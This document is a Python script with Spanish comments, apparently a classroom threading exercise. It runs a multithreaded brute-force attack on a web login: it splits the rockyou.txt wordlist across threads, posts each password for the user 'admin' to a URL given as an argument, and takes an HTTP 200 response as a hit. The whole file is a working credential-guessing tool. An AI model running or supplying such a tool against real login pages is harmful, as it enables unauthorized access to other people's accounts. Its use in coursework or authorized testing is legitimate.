import threading
import requests
from datetime import datetime
from sys import argv


# creamos una clase hilo heredando
# la la clase hilo de la libreria threading

class Mi_hilo(threading.Thread):
    # el hilo se inicializa con una lista de contraseñas, una url y un tiempo que tarda desde que empieza hasta que se para
    def __init__(self, contrasenas, url,tiempo):
        self.url = url
        self.contrasena = ''
        # Recibe los atributos de este hilo
        self.contrasenas = contrasenas
        # Inicializa flag de finalización del hilo
        self.final = False
        self.tiempo = tiempo
        self.tfinal = None
        # Inicializa el Thread, llamando a la superclase
        threading.Thread.__init__(self)

    # creamos el metodo run, el cual sustituye al argumento
    # target, aquí dentro iria el código que permite iterar por la lista
    # de contraseñas

    def run(self): 
    # Este método sustituye al target del Thread
    # Código que ejecuta cada hilo
        with requests.session() as s:
            for contrasena in self.contrasenas:
                if self.final:
                    return
                datos = {'username': 'admin','password':contrasena}
                peticion = s.post(self.url,data=datos)
                if  peticion.status_code == 200:
                    # si el codigo de la peticion es 200, quiere decir que la contraseña es correcta
                    self.tfinal = datetime.now() - self.tiempo
                    # calculamos el tiempo
                    self.contrasena_correcta = contrasena
                    print(self.contrasena_correcta + " " + str(self.tfinal))
                    for hilo in self.hilos:
                        # No para el hilo actual
                        if hilo!=self:
                            hilo.stop()
                            #print(self.final)
                    return
                #else:
                    #r += "[+] === Contraseña :" + contrasena + " incorrecta!!!" + '\n'
                    #print(r)
                    
    def stop(self):
        # Definimos stop() activando la flag de finalización
        self.final = True

    # Sobrecargamos método start para recibir la lista con el resto de hilos
    def start(self, hilos):
        self.hilos = hilos
        # Llama al método start() de la superclase el cual comienza la ejecución de los hilos
        threading.Thread.start(self)

if __name__ == '__main__':
    url = 'http://' + argv[1]

    # el numero de hilos que se quiere probar
    n_hilos = int(argv[2])

    lista_contrasenas = []
    contrasena = []
    contador = 0
    restantes = 0


    # HACK para poder ejecutar los hilos de forma eficiente
    # hemos dividido el fichero rockyou en una lista de listas, se crearían
    # tantas listas de contraseñas como longitud del fichero / numero de hilos
    # ya que cada hilo va a recoger en su target una lista de contraseñas ...

    with open("rockyou.txt", "r", encoding="ANSI") as fman:
        total_filas = len(fman.readlines())
        # total de filas del fichero
        
        if total_filas % n_hilos:
        
        # HACK por si el numero de hilos al dividir el
        # fichero hace que sobren lineas (que no sea divisor), las restantes iran a una lista aparte

            restantes = total_filas % n_hilos
        salto = total_filas // n_hilos

    with open("rockyou.txt", "r", encoding="ANSI") as fman:
        while contador <= total_filas:
            if contador + total_filas // n_hilos > total_filas:
                break
            # Dividimos todas las contraseñas según hilos
            contrasena = []
            for _ in range(contador, salto):
            
            #HACK: para cada elemento en el rango contador (empieza en cero) y salto (dividir el fichero entre numero de hilos)
            # vamos añadiendo las contraseñas a la lista, cuando termine de iterar en este salto, sumamos la cantidad de lineas
            # leidas

                contrasena.append(fman.readline().rstrip())
            lista_contrasenas.append(contrasena)

            # en cada iteracion, vamos añadiendo al contador el salto que hemos realizado
            # y al salto tambien, hasta completar el fichero

            contador += total_filas // n_hilos
            salto += total_filas // n_hilos

        if restantes:
            # si restantes en true (es decir, hay restantes) 
            # se guardan en otra lista
            for _ in range(restantes):
                contrasena.append(fman.readline().rstrip())

    # Lista de hilos
    hilos = []
    # Crea los hilos
    for i in range(len(lista_contrasenas)):
        hilos.append(Mi_hilo(lista_contrasenas[i], url,datetime.now()))
    # Inicia los hilos
    for hilo in hilos:
        hilo.start(hilos)